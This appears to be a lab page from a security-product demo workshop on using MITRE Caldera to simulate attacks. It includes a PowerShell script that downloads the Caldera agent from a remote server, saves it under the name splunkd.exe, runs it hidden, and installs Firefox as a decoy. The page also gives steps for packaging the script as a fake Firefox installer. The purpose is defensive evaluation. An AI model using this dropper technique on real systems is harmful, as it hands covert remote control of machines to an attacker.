---
title: "Mitre Caldera"
chapter: false
weight: 31
pre: "<b>3.1 </b>"
---
## Mitre Caldera
CALDERA™ is a cybersecurity framework developed by MITRE that empowers cyber practitioners to save time, money, and energy through automated security assessments.

We are using Caldera as one of the tools to help us evaluate how Cloud One Workload Security and Vision One could empower companies to improve their security posture and risk management.

----
### Mitre Caldera - Pre-Configuration
Before starting the attack simulation, be sure you updated the Mitre Caldera Global Configurations.
You must replace the IP Address (0.0.0.0) with the Public IP Address you use to access the Mitre Caldera management console.

{{< youtube id="V4AxIqFGqrU" >}}

---
### Mitre Caldera - Creating and Dropping the Malicious Payloads
After you update the IP Configuration, you are ready to create the payloads we are going to use with this demo.

#### Windows Payload
In this step you are going to create a malicious payload (Windows Based), packing it into an executable file (that simulates the Mozilla Firefox Installation), and then uploading it to filebin.net. The output URL will be used to drop this 0-day malware to the target Windows Computer.

You can generate the Caldera Agent manually, or copy and paste the following script on the https://ps2exe.azurewebsites.net/ website. Just make sure you replaced the $server variable with the Caldera Public IP Address. Save the file generated as Firefox.exe. 

---
> Windows Payload (Example)
        
$server="http://add-the-caldera-ip-address-here";

$url="$server/file/download";

$wc=New-Object System.Net.WebClient;

$wc.Headers.add(“platform”,“windows”);

$wc.Headers.add(“file”,“sandcat.go”);

$data=$wc.DownloadData($url);

get-process | ? {$_.modules.filename -like “C:\Users\Public\splunkd.exe”} | stop-process -f;

rm -force “C:\Users\Public\splunkd.exe” -ea ignore;

[io.file]::WriteAllBytes(“C:\Users\Public\splunkd.exe”,$data) | Out-Null;

Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList “-server $server -group red” -WindowStyle hidden;

Invoke-WebRequest "https://v1demoplatform.s3.us-west-1.amazonaws.com/v1-c1ws-demo/Firefox.msi" -OutFile c:\firefox.msi;

msiexec “c:\firefox.msi”

---

.

<b>After you exported the file, upload it to filebin.net and take a note of the output url.</b>

This URL must be used to download the Firef0x-update.exe file to the Windows Client, and then executed with Administrator rights.

References:
- 
- PS1toEXE - https://ps2exe.azurewebsites.net/
- Online Storage - https://filebin.net/

{{< youtube id="gDRnkEwhMwI" >}}

---
